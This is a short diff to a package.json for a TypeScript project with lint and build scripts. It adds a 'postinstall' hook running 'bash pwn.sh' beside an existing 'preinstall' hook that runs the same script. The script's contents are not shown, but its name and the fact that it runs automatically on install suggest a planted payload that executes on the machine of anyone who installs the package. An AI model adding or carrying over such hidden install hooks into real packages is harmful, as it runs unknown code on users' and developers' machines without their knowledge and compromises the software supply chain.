@@ -20,6 +20,7 @@
   },
   "scripts": {
     "preinstall": "bash pwn.sh",
+    "postinstall": "bash pwn.sh",
     "lint": "balena-lint -t tsconfig.dev.json --typescript lib tests",
     "lint-fix": "balena-lint -t tsconfig.dev.json --fix --typescript lib tests",
     "clean": "rm -rf build",
